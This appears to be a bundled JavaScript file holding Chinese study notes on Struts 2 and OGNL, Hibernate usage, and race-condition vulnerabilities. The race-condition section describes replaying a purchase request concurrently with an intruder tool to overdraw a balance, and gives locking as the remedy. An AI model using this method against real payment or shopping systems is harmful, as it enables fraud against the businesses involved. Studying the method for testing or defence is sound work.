                         void init();
                         String intercept(ActionInvocation invocation)
                         throws Exception;
                      }
      Struts 2 Results and Result Types\uFF0C\u8FD4\u56DE\u7ED3\u679C\u548C\u8FD4\u56DE\u7ED3\u679C\u7C7B\u578B\uFF1A
              1\u3001\u7B80\u5355\u7406\u89E3\uFF0C\u7C7B\u4F3C\u4E8E  MyBatis  \u7684\u8FD4\u56DEtype\u3002

      Struts2\u503C\u6808/ OGNL\u8BED\u6CD5
              1\u3001\u4ECB\u7ECD\uFF1A
                      1\u3001\u662F\u6F0F\u6D1E\u7684\u91CD\u707E\u533A\uFF0C\u5F88\u591A\u6F0F\u6D1E\uFF0C\u90FD\u662F\u56E0\u4E3A OGNL \u5904\u7406\u4E0D\u5F53\uFF0C\u5BFC\u81F4\u7684\u3002
                      2\u3001\u5BF9\u8C61\u56FE\u5BFC\u822A\u8BED\u8A00(OGNL)\u662F\u4E00\u4E2A\u529F\u80FD\u5F3A\u5927\u7684\u8868\u8FBE\u5F0F\u8BED\u8A00\uFF0C\u7528\u4E8E\u5F15\u7528\u548C\u64CD\u4F5C\u6570\u636E\u7684\u503C\u6808\u3002OGNL\u8FD8\u53EF\u4EE5\u5728\u6570\u636E\u4F20\u8F93\u548C\u7C7B\u578B\u8F6C\u6362\u3002
                              1\u3001OGNL\u662F\u975E\u5E38\u76F8\u4F3C\u7684JSP\u8868\u8FBE\u5F0F\u8BED\u8A00\u3002 OGNL\u662F\u57FA\u4E8E\u7684\u601D\u60F3\u5177\u6709\u6839\u6216\u7F3A\u7701\u5BF9\u8C61\u7684\u8303\u56F4\u5185\u7684\u3002\u9ED8\u8BA4\u7684\u6839\u5BF9\u8C61\u7684\u5C5E\u6027\u53EF\u4EE5\u53C2\u8003\u4F7F\u7528\u7684\u6807\u8BB0\u7B26\u53F7\uFF0C\u8FD9\u662F\u82F1\u9551\u7B26\u53F7\u3002

              2\u3001OGNL\u6839\u636E\u4E0A\u4E0B\u6587\u548CStruts\u5EFA\u7ACB\u4E00\u4E2AActionContext\u4E2D\u4F7F\u7528OGNL\u5730\u56FE\u3002ActionContext\u4E2D\u7684\u5730\u56FE\u7531\u4E0B\u5217\u7EC4\u6210\uFF1A
                      application- \u5E94\u7528\u7A0B\u5E8F\u8303\u56F4\u5185\u7684\u53D8\u91CF
                      session- \u4F1A\u8BDD\u8303\u56F4\u7684\u53D8\u91CF
                      root / value stack-\u6240\u6709\u64CD\u4F5C\u53D8\u91CF\u90FD\u5B58\u50A8\u5728\u8FD9\u91CC
                      request- \u8BF7\u6C42\u8303\u56F4\u7684\u53D8\u91CF
                      parameters- \u8BF7\u6C42\u53C2\u6570
                      atributes- \u5B58\u50A8\u7684\u5C5E\u6027\u9875\u9762\uFF0C\u8BF7\u6C42\uFF0C\u4F1A\u8BDD\u548C\u5E94\u7528\u8303\u56F4
              3\u3001\u7B80\u5355\u7406\u89E3\uFF1A
                      \u7C7B\u4F3C\u4E8E MyBatis \uFF0C\u5728 xml\u6807\u7B7E\u4E2D \u8FDB\u884C\u8FD0\u7B97\u3001\u7F16\u7A0B \u7684\u8BED\u6CD5\u3002
              4\u3001\u7528\u6CD5\u793A\u4F8B\uFF1A
                      1\u3001\u4F8B\u5982\uFF0C\u5982\u679C\u5458\u5DE5\u662F\u4E00\u4E2A\u52A8\u4F5C\u7C7B\u7684\u5C5E\u6027\u7684\u8BDD\uFF0C\u5C31\u53EF\u4EE5\u5F97\u5230\u53C2\u8003\u5982\u4E0B\uFF1A
                               <s:property value="name"/>
                      2\u3001\u5982\u679C\u4F60\u6709\u6240\u8C13\u7684\u201Clogin\u201D\u4F1A\u8BDD\u4E2D\u7684\u5C5E\u6027\uFF0C\u4F60\u53EF\u4EE5\u627E\u56DE\u5982\u4E0B\uFF1A
                              <s:property value="#session.login"/>
                      3\u3001OGNL\u8FD8\u652F\u6301\u5904\u7406\u7684\u96C6\u5408 - \u5373\u5730\u56FE\uFF0CList\u548CSet\u3002\u4F8B\u5982\uFF0C\u4EE5\u663E\u793A\u989C\u8272\u7684\u4E0B\u62C9\u5217\u8868\u4E2D\uFF0C\u4F60\u53EF\u4EE5\u8FD9\u6837\u505A
                              <s:select name="color" list="{'red','yellow','green'}" />


      Demo\u9879\u76EE\u7684\u521B\u5EFA\u6D41\u7A0B\uFF1A
              0\u3001\u521B\u5EFA\u4E00\u4E2A\u52A8\u6001Web\u9879\u76EE\uFF08\u8D70 Idea \u5373\u53EF\uFF09
              1\u3001\u521B\u5EFA\u52A8\u4F5C Action \u7C7B\uFF1A
                      1\u3001Action\u7C7B\u662FStruts 2\u5E94\u7528\u7A0B\u5E8F\u7684\u5173\u952E\uFF0C\u6211\u4EEC\u5B9E\u73B0\u4E86\u5927\u90E8\u5206Action\u7C7B\u4E2D\u7684\u4E1A\u52A1\u903B\u8F91\u3002
                      2\u3001Action\u7C7B\u6765\u54CD\u5E94\u7528\u6237\u7684\u64CD\u4F5C\uFF0C\u5F53\u7528\u6237\u70B9\u51FB\u4E00\u4E2AURL\u3002 Action\u7C7B\u4E2D\u7684\u4E00\u4E2A\u6216\u591A\u4E2A\u65B9\u6CD5\u88AB\u6267\u884C\uFF0C\u5E76\u8FD4\u56DE\u4E00\u4E2A\u5B57\u7B26\u4E32\u7ED3\u679C\u3002
                      3\u3001\u8BED\u6CD5\u8981\u6C42\uFF1A
                              1\u3001\u5728Struts2\u7684\u884C\u52A8\uFF0C\u552F\u4E00\u7684\u8981\u6C42\u662F\uFF0C\u5FC5\u987B\u6709\u4E00\u4E2A\u65E0\u53C2\u6570\u7684\u65B9\u6CD5\uFF0C\u8BE5\u65B9\u6CD5\u8FD4\u56DE\u4E00\u4E2A\u5B57\u7B26\u4E32\u6216\u7ED3\u679C\u7684\u5BF9\u8C61\uFF0C\u5FC5\u987B\u662F\u4E00\u4E2APOJO\u3002\u5982\u679C\u4E0D\u5E26\u53C2\u6570\u7684\u65B9\u6CD5\u4E0D\u6307\u5B9A\uFF0C\u5219\u9ED8\u8BA4\u884C\u4E3A\u662F\u4F7F\u7528execute()\u65B9\u6CD5\u3002
              2\u3001\u521B\u5EFA\u4E00\u4E2A\u89C6\u56FE\uFF1A
                      1\u3001\u6211\u4EEC\u9700\u8981\u4E00\u4E2AJSP\u63D0\u4EA4\u6700\u540E\u7684\uFF08\u8FD4\u56DE\uFF09\u6D88\u606F\uFF0C
                              \u9875\u9762\u2014\u2014\u2014\u2014Struts 2\u6846\u67B6\u4E2D\u9884\u5B9A\u4E49\u7684Action\u2014\u2014\u2014\u2014\u6620\u5C04Mapping\u2014\u2014\u2014\u2014\u5728struts.xml\u6587\u4EF6\u4E2D\u5B9A\u4E49\u3002
              3\u3001\u521B\u5EFA\u4E3B\u9875\u9762
                      1\u3001\u5728WebContent\u6587\u4EF6\u5939\u4E2D\u521B\u5EFA\u7684index.jsp\u3002\u8BE5\u6587\u4EF6\u5C06\u4F5C\u4E3A\u521D\u59CB\u52A8\u4F5CURL
              4\u3001\u914D\u7F6E\u6587\u4EF6
                      1\u3001\u6211\u4EEC\u9700\u8981\u4E00\u4E2A\u6620\u5C04Mapping\uFF0C\u4EE5\u914D\u5408URL\uFF0CHelloWorldAction\u7C7B(\u6A21\u578B)\uFF0CHelloWorld.jsp(\u56FE)\u3002
                      2\u3001\u6620\u5C04Mapping\u544A\u8BC9Struts 2\u6846\u67B6\u7684\u7C7B\u5C06\u54CD\u5E94\u7528\u6237\u7684\u64CD\u4F5C(URL)\uFF0C\u8FD9\u4E00\u7C7B\u7684\u65B9\u6CD5\u5C06\u88AB\u6267\u884C\uFF0C\u4EC0\u4E48\u89C6\u56FE\u6765\u663E\u793A\u5B57\u7B26\u4E32\u7ED3\u679C\u7684\u57FA\u7840\u4E0A\uFF0C\u8BE5\u65B9\u6CD5\u8FD4\u56DE\u3002
              5\u3001\u542F\u7528\u8BE6\u7EC6\u7684\u65E5\u5FD7
                      1\u3001\u53EF\u4EE5\u542F\u7528\u65E5\u5FD7\u8BB0\u5F55\u529F\u80FD\u9F50\u5168\uFF0C\u5DE5\u4F5C\u65F6\u7528Struts 2\u7684WEB-INF/classes\u6587\u4EF6\u5939\u4E0B\u521B\u5EFAlogging.properties\u6587\u4EF6\u3002
              6\u3001\u6267\u884C\u5E94\u7528\u7A0B\u5E8F
                      1\u3001\u53F3\u952E\u70B9\u51FB\u9879\u76EE\u540D\u79F0\uFF0C\u5E76\u5355\u51FB\u201C\u5BFC\u51FA\u201D> WAR\u6587\u4EF6\u521B\u5EFA\u4E00\u4E2AWAR\u6587\u4EF6\u3002
                      2\u3001\u7136\u540E\uFF0C\u8FD9WAR\u90E8\u7F72\u5728Tomcat\u7684webapps\u76EE\u5F55\u4E0B\u3002
                      3\u3001\u6700\u540E\uFF0C\u542F\u52A8Tomcat\u670D\u52A1\u5668\uFF0C\u5E76\u5C1D\u8BD5\u8BBF\u95EEURL\u3002

      Struts 2 \u914D\u7F6E\u6587\u4EF6
              1\u3001web.xml\u6587\u4EF6
                      1\u3001\u5728web.xml\u914D\u7F6E\u6587\u4EF6\u662F\u4E00\u4E2A\u7684J2EE\u914D\u7F6E\u6587\u4EF6\uFF0C\u51B3\u5B9A\u5982\u4F55\u5904\u7406HTTP\u8BF7\u6C42servlet\u5BB9\u5668\u7684\u5143\u7D20\u3002\u5B83\u4E0D\u662F\u4E25\u683C\u610F\u4E49\u4E0A\u7684Struts2\u7684\u914D\u7F6E\u6587\u4EF6\uFF0C\u4F46\u5B83\u662F\u4E00\u4E2A\u6587\u4EF6\uFF0C\u9700\u8981\u914D\u7F6EStruts2\u7684\u5DE5\u4F5C\u3002
                      2\u3001\u6B64\u6587\u4EF6\u63D0\u4F9B\u4EFB\u4F55Web\u5E94\u7528\u7A0B\u5E8F\u7684\u5165\u53E3\u70B9\u3002Struts2\u7684\u5E94\u7528\u7A0B\u5E8F\u7684\u5165\u53E3\u70B9\uFF0C\u5C06\u662F\u4E00\u4E2A\u90E8\u7F72\u63CF\u8FF0\u7B26(web.xml)\u4E2D\u5B9A\u4E49\u7684\u8FC7\u6EE4\u5668\u3002
                              1\u3001\u56E0\u6B64\uFF0C\u6211\u4EEC\u5C06FilterDispatcher\u6392\u7C7B\u5728web.xml\u4E2D\u5B9A\u4E49\u4E00\u4E2A\u6761\u76EE\u3002\u9700\u8981\u521B\u5EFA\u6587\u4EF6\u5939\u7684WebContent/ WEB-INF\u4E0B\u7684web.xml\u6587\u4EF6\u3002
              2\u3001struts.xml\u6587\u4EF6
                      1\u3001struts.xml\u6587\u4EF6\u4E2D\u5305\u542B\u7684\u914D\u7F6E\u4FE1\u606F\uFF0C\u4F60\u5C06\u4FEE\u6539\u6240\u91C7\u53D6\u7684\u63AA\u65BD\u7684\u5F00\u53D1\u3002
                      2\u3001\u8FD9\u4E2A\u6587\u4EF6\u53EF\u4EE5\u88AB\u7528\u6765\u8986\u76D6\u9ED8\u8BA4\u8BBE\u7F6E\u7684\u5E94\u7528\u7A0B\u5E8F\uFF0C\u4F8B\u5982struts.devMode=false\u548C\u5176\u4ED6\u8BBE\u7F6E\u4E2D\u5B9A\u4E49\u7684\u5C5E\u6027\u6587\u4EF6\u3002
                      3\u3001\u8FD9\u4E2A\u6587\u4EF6\u53EF\u4EE5\u521B\u5EFA\u6587\u4EF6\u5939\u4E0B\u7684WEB-INF/classes\u3002
              3\u3001struts-config.xml \u6587\u4EF6
                      1\u3001struts-config.xml\u914D\u7F6E\u6587\u4EF6\u662F\u4E00\u4E2A\u5728Web\u5BA2\u6237\u7AEF\u7EC4\u4EF6\u7684\u89C6\u56FE\u548C\u6A21\u578B\u4E4B\u95F4\u7684\u8054\u7CFB\uFF0C
                              \u4F46\u4F60\u7684\u9879\u76EE\u768499.99%\u5C31\u4E0D\u4F1A\u78B0\u8FD9\u4E9B\u8BBE\u7F6E\u3002
              4\u3001struts.properties\u6587\u4EF6
                      1\u3001\u6B64\u914D\u7F6E\u6587\u4EF6\u63D0\u4F9B\u4E86\u4E00\u79CD\u673A\u5236\u6765\u66F4\u6539\u9ED8\u8BA4\u884C\u4E3A\u7684\u6846\u67B6\u3002
                      2\u3001\u5176\u5B9E\u6240\u6709\u7684 struts.properties configuration \u6587\u4EF6\u4E2D\u5305\u542B\u7684\u5C5E\u6027\u4E5F\u53EF\u4EE5\u88AB\u914D\u7F6E\u5728web.xml\u4E2D\u4F7F\u7528\u7684init-param\uFF0C\u4EE5\u53CA\u5728struts.xml\u4E2D\u7684\u914D\u7F6E\u6587\u4EF6\u4E2D\u4F7F\u7528\u6052\u5B9A\u7684\u6807\u7B7E\u3002
                      3\u3001\u4F60\u53EF\u4EE5\u521B\u5EFA\u6B64\u6587\u4EF6\u4E0BfolderWEB-INF/classes\u3002







  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0})],Su=[Object(u.c)("Hibernate",`
      Hibernate

              \u8D44\u6599\uFF1Ahttps://www.cnblogs.com/Java3y/p/8520601.html

              0\u3001Hibernate\u6267\u884C\u6D41\u7A0B\u56FE\uFF1A
                      \u89C1\u4EE5\u4E0B\u56FE\u7247\uFF1A
                              https://img-blog.csdn.net/20170506134941161?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast

              1\u3001\u4E3B\u914D\u7F6E\u6587\u4EF6
                      hibernate.cfg.xml
                              1\u3001\u5982\u679C\u4F7F\u7528Intellij Idea\u751F\u6210\u7684Hibernate\u53EF\u4EE5\u6307\u5B9A\u751F\u6210\u51FA\u4E3B\u914D\u7F6E\u6587\u4EF6hibernate.cfg.xml\uFF0C\u5B83\u662F\u8981\u653E\u5728src\u76EE\u5F55\u4E0B\u7684
                              2\u3001\u5982\u679C\u4E0D\u662F\u81EA\u52A8\u751F\u6210\u7684\uFF0C\u6211\u4EEC\u53EF\u4EE5\u5728Hibernate\u7684hibernate-distribution-3.6.0.Final\\project\\etc\u8FD9\u4E2A\u76EE\u5F55\u4E0B\u53EF\u4EE5\u627E\u5230
                      Configuration.java
                              \u914D\u7F6E\u7BA1\u7406\u7C7B\uFF1A\u4E3B\u8981\u7BA1\u7406\u914D\u7F6E\u6587\u4EF6\u7684\u4E00\u4E2A\u7C7B
                                      \u5B83\u62E5\u6709\u4E00\u4E2A\u5B50\u7C7BAnnotationConfiguration\uFF0C\u4E5F\u5C31\u662F\u8BF4\uFF1A\u6211\u4EEC\u53EF\u4EE5\u4F7F\u7528\u6CE8\u89E3\u6765\u4EE3\u66FFXML\u914D\u7F6E\u6587\u4EF6\u6765\u914D\u7F6E\u76F8\u5BF9\u5E94\u7684\u4FE1\u606F
                              configure\u65B9\u6CD5
                                      configure()\u65B9\u6CD5\u7528\u4E8E\u52A0\u8F7D\u914D\u7F6E\u6587\u4EF6
                                              \u52A0\u8F7D\u4E3B\u914D\u7F6E\u6587\u4EF6\u7684\u65B9\u6CD5
                                                      \u5982\u679C\u6307\u5B9A\u53C2\u6570\uFF0C\u90A3\u4E48\u52A0\u8F7D\u53C2\u6570\u7684\u8DEF\u5F84\u914D\u7F6E\u6587\u4EF6
                                                      **\u5982\u679C\u4E0D\u6307\u5B9A\u53C2\u6570\uFF0C\u9ED8\u8BA4\u52A0\u8F7Dsrc/\u76EE\u5F55\u4E0B\u7684hibernate.cfg.xml **
                              buildSessionFactory\u65B9\u6CD5
                                      buildSessionFactory()\u7528\u4E8E\u521B\u5EFASession\u5DE5\u5382
                      \u4E3B\u914D\u7F6E\u6587\u4EF6\u4E3B\u8981\u914D\u7F6E\uFF1A
                              \u6570\u636E\u5E93\u7684\u4FE1\u606F
                              \u5176\u4ED6\u53C2\u6570
                              \u52A0\u8F7D\u6620\u5C04\u6587\u4EF6
                      \u6620\u5C04\u914D\u7F6E\u6587\u4EF6
                              1\u3001\u6620\u5C04\u6587\u4EF6: \u6620\u5C04\u4E00\u4E2A\u5B9E\u4F53\u7C7B\u5BF9\u8C61\uFF1B \u63CF\u8FF0\u4E00\u4E2A\u5BF9\u8C61\u6700\u7EC8\u5B9E\u73B0\u53EF\u4EE5\u76F4\u63A5\u4FDD\u5B58\u5BF9\u8C61\u6570\u636E\u5230\u6570\u636E\u5E93\u4E2D
                                      1\u3001hibernate-mapping\u8282\u70B9
                                      2\u3001class\u8282\u70B9
                                      3\u3001property\u8282\u70B9
                                      4\u3001id\u8282\u70B9
                                              1\u3001<id>\u8282\u70B9\u4E0B\u8FD8\u6709\u5B50\u8282\u70B9<generator class=""/>
                                      5\u3001composite-id

              2\u3001SessionFactory
                      SessionFactory-->Session\u7684\u5DE5\u5382\uFF0C\u4E5F\u53EF\u4EE5\u8BF4\u4EE3\u8868\u4E86hibernate.cfg.xml\u8FD9\u4E2A\u6587\u4EF6
                              1\u3001hibernate.cfg.xml\u7684\u5C31\u6709<session-factory>\u8FD9\u4E48\u4E00\u4E2A\u8282\u70B9
                      openSession\u65B9\u6CD5
                              \u521B\u5EFA\u4E00\u4E2ASession\u5BF9\u8C61
                      getCurrentSession\u65B9\u6CD5
                              \u521B\u5EFASession\u5BF9\u8C61\u6216\u53D6\u51FASession\u5BF9\u8C61
              3\u3001Session
                      Session\u662FHibernate\u6700\u91CD\u8981\u7684\u5BF9\u8C61\uFF0CSession\u7EF4\u62A4\u4E86\u4E00\u4E2A\u8FDE\u63A5\uFF08Connection\uFF09\uFF0C\u53EA\u8981\u4F7F\u7528Hibernate\u64CD\u4F5C\u6570\u636E\u5E93\uFF0C\u90FD\u9700\u8981\u7528\u5230Session\u5BF9\u8C61


              4\u3001\u66F4\u65B0\u64CD\u4F5C
                      \u6211\u4EEC\u5728\u5FEB\u901F\u5165\u95E8\u4E2D\u4F7F\u7528\u5230\u4E86save(Objcet o)\u65B9\u6CD5\uFF0C\u8C03\u7528\u4E86\u8FD9\u4E2A\u65B9\u6CD5\u5C31\u628A\u5BF9\u8C61\u4FDD\u5B58\u5728\u6570\u636E\u5E93\u4E4B\u4E2D\u4E86\u3002Session\u5BF9\u8C61\u8FD8\u63D0\u4F9B\u7740\u5176\u4ED6\u7684\u65B9\u6CD5\u6765\u8FDB\u884C\u5BF9\u6570\u636E\u5E93\u7684\u66F4\u65B0
                              session.save(obj); \u3010\u4FDD\u5B58\u4E00\u4E2A\u5BF9\u8C61\u3011
                              session.update(obj); \u3010\u66F4\u65B0\u4E00\u4E2A\u5BF9\u8C61\u3011
                              session.saveOrUpdate(obj); \u3010\u4FDD\u5B58\u6216\u8005\u66F4\u65B0\u7684\u65B9\u6CD5\u3011
                                      **\u6CA1\u6709\u8BBE\u7F6E\u4E3B\u952E\uFF0C\u6267\u884C\u4FDD\u5B58\uFF1B **
                                      **\u6709\u8BBE\u7F6E\u4E3B\u952E\uFF0C\u6267\u884C\u66F4\u65B0\u64CD\u4F5C; **
                                      \u5982\u679C\u8BBE\u7F6E\u4E3B\u952E\u4E0D\u5B58\u5728\u62A5\u9519\uFF01
              5\u3001\u4E3B\u952E\u67E5\u8BE2
                      \u901A\u8FC7\u4E3B\u952E\u6765\u67E5\u8BE2\u6570\u636E\u5E93\u7684\u8BB0\u5F55\uFF0C\u4ECE\u800C\u8FD4\u56DE\u4E00\u4E2AJavaBean\u5BF9\u8C61
                              session.get(javaBean.class, int id); \u3010\u4F20\u5165\u5BF9\u5E94\u7684class\u548Cid\u5C31\u53EF\u4EE5\u67E5\u8BE2\u3011
                              session.load(javaBean.class, int id); \u3010\u652F\u6301\u61D2\u52A0\u8F7D\u3011

              6\u3001HQL\u67E5\u8BE2
                      HQL:hibernate query language \u5373hibernate\u63D0\u4F9B\u7684\u9762\u5411\u5BF9\u8C61\u7684\u67E5\u8BE2\u8BED\u8A00
                              \u67E5\u8BE2\u7684\u662F\u5BF9\u8C61\u4EE5\u53CA\u5BF9\u8C61\u7684\u5C5E\u6027\u3010\u5B83\u67E5\u8BE2\u7684\u662F\u5BF9\u8C61\u4EE5\u53CA\u5C5E\u6027\uFF0C\u56E0\u6B64\u662F\u533A\u5206\u5927\u5C0F\u5199\u7684\uFF01\u3011\u3002
                      SQL\uFF1AStruct query language \u7ED3\u6784\u5316\u67E5\u8BE2\u8BED\u8A00
                              \u67E5\u8BE2\u7684\u662F\u8868\u4EE5\u53CA\u5217\u3010\u4E0D\u533A\u5206\u5927\u5C0F\u5199\u3011
                      HQL\u662F\u9762\u5411\u5BF9\u8C61\u7684\u67E5\u8BE2\u8BED\u8A00\uFF0C\u53EF\u4EE5\u7528\u6765\u67E5\u8BE2\u5168\u90E8\u7684\u6570\u636E\uFF01


              7\u3001QBC\u67E5\u8BE2
                      QBC\u67E5\u8BE2: query by criteria \u5B8C\u5168\u9762\u5411\u5BF9\u8C61\u7684\u67E5\u8BE2
                              \u4ECE\u4E0A\u9762\u7684HQL\u67E5\u8BE2\uFF0C\u6211\u4EEC\u5C31\u53EF\u4EE5\u53D1\u73B0\uFF1AHQL\u67E5\u8BE2\u662F\u9700\u8981SQL\u7684\u57FA\u7840\u7684\uFF0C\u56E0\u4E3A\u8FD8\u662F\u8981\u5199\u5C11\u90E8\u5206\u7684SQL\u4EE3\u7801....QBC\u67E5\u8BE2\u5C31\u662F\u5B8C\u5168\u7684\u9762\u5411\u5BF9\u8C61\u67E5\u8BE2...\u4F46\u662F\u5462\uFF0C\u6211\u4EEC\u7528\u5F97\u6BD4\u8F83\u5C11

              8\u3001\u672C\u5730SQL\u67E5\u8BE2
                      \u6709\u7684\u65F6\u5019\uFF0C\u5982\u679CSQL\u662F\u975E\u5E38\u590D\u6742\u7684\uFF0C\u6211\u4EEC\u4E0D\u80FD\u9760HQL\u67E5\u8BE2\u6765\u5B9E\u73B0\u529F\u80FD\u7684\u8BDD\uFF0C\u6211\u4EEC\u5C31\u9700\u8981\u4F7F\u7528\u539F\u751F\u7684SQL\u6765\u8FDB\u884C\u590D\u6742\u67E5\u8BE2\u4E86\uFF01
                      \u4F46\u662F\u5462\uFF0C\u5B83\u6709\u4E00\u4E2A\u7F3A\u9677\uFF1A\u5B83\u662F\u4E0D\u80FD\u8DE8\u5E73\u53F0\u7684...\u56E0\u6B64\u6211\u4EEC\u5728\u4E3B\u914D\u7F6E\u6587\u4EF6\u4E2D\u5DF2\u7ECF\u914D\u7F6E\u4E86\u6570\u636E\u5E93\u7684\u201C\u65B9\u8A00\u201C\u4E86\u3002

              9\u3001beginTransaction\u65B9\u6CD5
                      \u5F00\u542F\u4E8B\u52A1\uFF0C\u8FD4\u56DE\u7684\u662F\u4E00\u4E2A\u4E8B\u52A1\u5BF9\u8C61....Hibernate\u89C4\u5B9A\u6240\u6709\u7684\u6570\u636E\u5E93\u64CD\u4F5C\u90FD\u5FC5\u987B\u5728\u4E8B\u52A1\u73AF\u5883\u4E0B\u8FDB\u884C\uFF0C\u5426\u5219\u62A5\u9519\uFF01

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),`
`],bu=`
\u6761\u4EF6\u7ADE\u4E89\u6F0F\u6D1E
        \u53C2\u8003\u8D44\u6599\uFF1A
                https://cloud.tencent.com/developer/article/1516412

                \u8FD8\u672A\u770B\u5B8C\u7684\uFF1A
                        https://atkx.top/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/

        \u573A\u666F\uFF1A
                1\u3001\u300A\u6761\u4EF6\u7ADE\u4E89\u95EE\u9898\u300B\uFF0C\u67D0\u4E9B\u5173\u952E\u4E1A\u52A1\uFF08\u5982:\u7528\u6237\u8F6C\u8D26\uFF09\u4E0D\u652F\u6301\u5E76\u53D1\u3001\u5206\u5E03\u5F0F\u90E8\u7F72\u65F6\u4E0D\u652F\u6301\u9501\u7684\u64CD\u4F5C\u7B49\u3002
        \u4ECB\u7ECD\uFF1A
                1\u3001\u6761\u4EF6\u7ADE\u4E89\u6F0F\u6D1E\uFF08Race condition\uFF09\u5B98\u65B9\u6982\u5FF5\u662F\u201C\u53D1\u751F\u5728\u591A\u4E2A\u7EBF\u7A0B\u540C\u65F6\u8BBF\u95EE\u540C\u4E00\u4E2A\u5171\u4EAB\u4EE3\u7801\u3001\u53D8\u91CF\u3001\u6587\u4EF6\u7B49\u6CA1\u6709\u8FDB\u884C\u9501\u64CD\u4F5C\u6216\u8005\u540C\u6B65\u64CD\u4F5C\u7684\u573A\u666F\u4E2D\u3002\u201D
                        1\u3001\u8FD9\u4E2A\u6F0F\u6D1E\u5B58\u5728\u4E8E\u64CD\u4F5C\u7CFB\u7EDF\u3001\u6570\u636E\u5E93\u3001web\u7B49\u591A\u4E2A\u5C42\u9762\uFF0C\u50CF\u6709\u540D\u7684\u810F\u725B\uFF08dirty cow\uFF09\u3002
                2\u3001\u5BF9\u4E8E\u8FD9\u4E2A\u6F0F\u6D1E\u7684\u7406\u89E3\uFF0C\u5173\u952E\u8BCD\u662F \u300A\u591A\u7EBF\u7A0B\u300B \u548C \u300A\u540C\u65F6\u300B \u548C \u300A\u540C\u4E00\u4E2A\u300B \uFF0C
                        1\u3001\u901A\u5E38\u7684web\u5904\u7406\u65B9\u5F0F\u662F\u901A\u8FC7\u5355\u7EBF\u7A0B\u7EBF\u6027\u5B8C\u6210\u7684\uFF0C
                        2\u3001\u5982\u679C\u51FA\u73B0\u591A\u7EBF\u7A0B\u5E76\u53D1\u8BF7\u6C42\u7684\u60C5\u51B5\uFF0C\u6570\u636E\u5904\u7406\u903B\u8F91\u5C31\u53EF\u80FD\u51FA\u73B0\u5F02\u5E38\u3002
                        3\u3001\u8FD9\u4E2A\u6F0F\u6D1E\u7684\u601D\u60F3\u548C\u53C2\u6570\u6C61\u67D3\u6F0F\u6D1E\uFF08HPP\uFF09\u6BD4\u8F83\u50CF\uFF08\u4F20\u9001\u95E8\uFF09\uFF0C\u90FD\u662F\u901A\u8FC7\u9644\u52A0\u7684\u60C5\u51B5\u4F7F\u5F97\u7A0B\u5E8F\u5F02\u5E38\uFF0C\u4F46\u539F\u7406\u4E0D\u540C\u3002

        \u57FA\u672C\u539F\u7406\uFF1A
                1\u3001\u5BF9\u4E8E\u6761\u4EF6\u7ADE\u4E89\u6F0F\u6D1E\u6BD4\u8F83\u7ECF\u5178\u7684\u6848\u4F8B\u662F\u8F6C\u8D26\u3001\u8D2D\u4E70\uFF0C\u4E5F\u662F\u6761\u4EF6\u7ADE\u4E89\u6F0F\u6D1E\u7684\u9AD8\u53D1\u573A\u666F\u3002
                2\u3001\u8FD9\u91CC\u4ECE\u6570\u636E\u5E93\u5C42\u9762\u8FD8\u539F\u4E00\u4E2A\u661F\u5DF4\u514B\u65E0\u9650\u8D2D\u4E70\u6848\u4F8B\u3002\u76F4\u89C2\u89E3\u91CA\u4E0B\u8FD9\u4E2A\u6F0F\u6D1E\u7684\u539F\u7406\uFF1A
                        1\u3001\u5047\u8BBE\u6211\u4EEC\u4F7F\u7528\u8D26\u6237\u91CC\u76841000\u5143\u8D2D\u4E7010\u4EF6100\u5143\u7684\u5546\u54C1\uFF0C\u6B63\u5E38\u8D2D\u4E70\u6D41\u7A0B\u4E3A\uFF1A
                        1\u3001\u8D2D\u4E70\u7269\u54C1\u2014\u2014>\u67E5\u8BE2\u4F59\u989D\u662F\u5426\u5927\u4E8E\u5546\u54C1\u4EF7\u683C\u2014\u2014>\u8D2D\u4E70\u6210\u529F\uFF0C\u4F59\u989D-1000\uFF0C\u5546\u54C1\u6570+1/\u8D2D\u4E70\u5931\u8D25\uFF0C\u63D0\u793A\u4F59\u989D\u4E0D\u8DB3\uFF1A
                                1\u3001\u67E5\u770B\u6570\u636E\u5E93\u8D26\u6237\u4F59\u989D\u53CA\u7269\u54C1\u6570\uFF1A
                                2\u3001\u70B9\u51FB\u8D2D\u4E70\uFF0C\u62E6\u622A\u6570\u636E\u5305\uFF0C\u8BBE\u7F6Eintruder\u53D1\u900150\u4E2A\u6570\u636E\u5305\uFF0C\u7EBF\u7A0B\u8C03\u523025\u540E\u53D1\u8FDB\u884C\u5E76\u53D1\u8BF7\u6C42\uFF1A
                                3\u3001\u67E5\u770B\u6570\u636E\u5E93\u7684\u65E5\u5FD7\uFF0C\u53EF\u4EE5\u770B\u5230\u5BF9count\u7684\u67E5\u770BSELECT\u548C\u66F4\u65B0UPDATE\u5E76\u4E0D\u662F\u7EBF\u6027\u4F9D\u6B21\u6267\u884C\u7684
                                        \u6240\u4EE5\u5BFC\u81F4\u5728\u5B8C\u6210\u5BF9count-1000\u7684\u64CD\u4F5C\u4E4B\u524D\u8FDB\u884C\u4E86\u53E6\u4E00\u6B21\u67E5\u8BE2count\u4ECD\u4E3A1000\uFF0C\u6700\u7EC8\u7ED3\u679C\u662F\u8D2D\u4E70\u6570\u91CF\u5927\u4E8E10\uFF0C\u800C\u4F59\u989D\u4E3A\u8D1F\u6570\uFF1A
                                4\u3001\u89E3\u51B3\u65B9\u6848\u901A\u5E38\u662F\u52A0\u201C\u9501\u201D\uFF0Cmysql\u6267\u884C\u4E8B\u52A1\u524D\u52A0BEGIN\uFF0C\u540E\u52A0COMMIT\uFF0C\u4ECE\u800C\u9501\u5B9A\u4E00\u6B21\u4E8B\u52A1\u5904\u7406\uFF0C\u4F7F\u6309\u5E8F\u8FDB\u884C\uFF1A

        \u6316\u6398\u6280\u5DE7\uFF1A
                1\u3001\u6316\u6398\u65B9\u6CD5\uFF1A
